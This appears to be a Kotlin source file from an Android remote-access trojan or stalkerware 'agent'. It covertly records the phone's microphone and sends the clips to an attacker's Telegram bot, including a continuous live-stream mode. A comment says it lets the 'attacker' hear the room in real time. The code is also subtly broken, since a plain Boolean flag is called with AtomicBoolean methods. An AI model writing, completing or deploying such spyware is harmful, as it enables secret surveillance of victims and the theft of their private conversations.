package com.example.agent.capabilities

import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import androidx.core.content.ContextCompat
import com.example.agent.TelegramClient
import com.example.agent.ErrorReporter
import java.io.File
import kotlin.jvm.Volatile
import java.util.concurrent.atomic.AtomicBoolean

class AudioCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    private var liveRecorder: MediaRecorder? = null
    @Volatile private var streaming = false

    private fun hasAudioPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.RECORD_AUDIO) == 
                android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    // ─────────────────────────────────────────────
    // RECORD: captures mic for N seconds
    // Saves as .mp3, uploads to Telegram
    // Telegram renders it as a playable audio message
    // ─────────────────────────────────────────────
    fun record(seconds: Long) {
        if (!hasAudioPermission()) {
            telegram.sendText("❌ Audio permission denied")
            return
        }
        telegram.sendText("🎙️ Recording ${seconds}s...")

        val file = File(ctx.cacheDir, "rec_${System.currentTimeMillis()}.mp3")
        var recorder: MediaRecorder? = null

        try {
            recorder = MediaRecorder(ctx.applicationContext).apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            Thread.sleep(seconds * 1000)

            recorder.stop()
            recorder.release()
            recorder = null
            telegram.sendAudio(file)
        } catch (e: Exception) {
            telegram.sendText("❌ Recording failed: ${e.message}")
            ErrorReporter.report(e, "AudioCapability")
        } finally {
            try { recorder?.stop() } catch (_: Exception) {}
            try { recorder?.release() } catch (_: Exception) {}
            file.delete()
        }
    }

    // ─────────────────────────────────────────────
    // LIVE STREAM: keeps mic open
    // Sends 30s chunks continuously to Telegram
    // Attacker hears real-time audio from the room
    // /mic stop to end
    // ─────────────────────────────────────────────
    fun startStream() {
        if (!hasAudioPermission()) {
            telegram.sendText("❌ Audio permission denied")
            return
        }
        if (streaming) {
            telegram.sendText("Already streaming. /mic stop first.")
            return
        }

        streaming = true
        telegram.sendText("🎙️ Mic stream started. Sending 30s chunks. /mic stop to end.")

        Thread {
            while (streaming) {
                val file = File(ctx.cacheDir, "stream_${System.currentTimeMillis()}.mp3")
                var rec: MediaRecorder? = null

                try {
                    rec = MediaRecorder(ctx.applicationContext).apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setOutputFile(file.absolutePath)
                        prepare()
                        start()
                    }
                    liveRecorder = rec

                    Thread.sleep(30_000)

                    // Check if stopped during sleep
                    if (!streaming.get()) break

                    rec.stop()
                    rec.release()
                    telegram.sendAudio(file)
                } catch (e: Exception) {
                    ErrorReporter.report(e, "AudioCapability.startStream")
                    telegram.sendText("❌ Stream error: ${e.message}")
                    streaming.set(false)
                } finally {
                    try { rec?.stop() } catch (_: Exception) {}
                    try { rec?.release() } catch (_: Exception) {}
                    file.delete()
                }
            }
            liveRecorder = null
            streaming.set(false)
        }.start()
    }

    fun stopStream() {
        if (!streaming.get()) {
            telegram.sendText("Not currently streaming.")
            return
        }
        streaming.set(false)
        val recorder = liveRecorder
        liveRecorder = null
        try {
            recorder?.stop()
        } catch (_: Exception) {}
        try {
            recorder?.release()
        } catch (_: Exception) {}
        telegram.sendText("🎙️ Mic stream stopped.")
    }
}
